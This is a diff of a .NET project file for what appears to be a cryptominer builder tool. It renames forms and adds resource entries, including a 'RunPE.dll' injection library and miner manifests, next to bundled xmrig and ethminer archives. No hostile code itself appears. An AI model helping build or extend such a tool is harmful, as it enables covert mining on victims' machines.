@@ -124,14 +124,20 @@
   <ItemGroup>
     <Compile Include="Classes\Codedom.cs" />
     <Compile Include="Classes\FormSerializer.cs" />
+    <Compile Include="Forms\AdvancedOptions.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\AdvancedOptions.Designer.cs">
+      <DependentUpon>AdvancedOptions.cs</DependentUpon>
+    </Compile>
     <Compile Include="My Project\MyNamespace.Dynamic.Designer.cs" />
     <Compile Include="My Project\MyNamespace.Static.1.Designer.cs" />
     <Compile Include="My Project\MyNamespace.Static.2.Designer.cs" />
     <Compile Include="My Project\MyNamespace.Static.3.Designer.cs" />
-    <Compile Include="Forms\Advanced.Designer.cs">
-      <DependentUpon>Advanced.cs</DependentUpon>
+    <Compile Include="Forms\AlgorithmSelection.Designer.cs">
+      <DependentUpon>AlgorithmSelection.cs</DependentUpon>
     </Compile>
-    <Compile Include="Forms\Advanced.cs">
+    <Compile Include="Forms\AlgorithmSelection.cs">
       <SubType>Form</SubType>
     </Compile>
     <Compile Include="Forms\Builder.cs">
@@ -170,10 +176,12 @@
       <DependentUpon>Resources.resx</DependentUpon>
     </Compile>
     <Content Include="Resources\Code\Checker.cs" />
+    <None Include="Resources\RunPE.dll" />
     <None Include="app.config" />
     <None Include="My Project\app.manifest">
       <SubType>Designer</SubType>
     </None>
+    <None Include="Resources\Compilers\user.manifest-miner" />
     <None Include="Resources\Compilers\administrator.manifest-miner" />
     <None Include="Resources\Compilers\Compilers.zip" />
     <None Include="Resources\Miners\ethminer.zip" />
@@ -185,8 +193,11 @@
     <None Include="Resources\Miners\xmrig.zip" />
   </ItemGroup>
   <ItemGroup>
-    <EmbeddedResource Include="Forms\Advanced.resx">
-      <DependentUpon>Advanced.cs</DependentUpon>
+    <EmbeddedResource Include="Forms\AdvancedOptions.resx">
+      <DependentUpon>AdvancedOptions.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\AlgorithmSelection.resx">
+      <DependentUpon>AlgorithmSelection.cs</DependentUpon>
     </EmbeddedResource>
     <EmbeddedResource Include="Forms\Builder.resx">
       <DependentUpon>Builder.cs</DependentUpon>
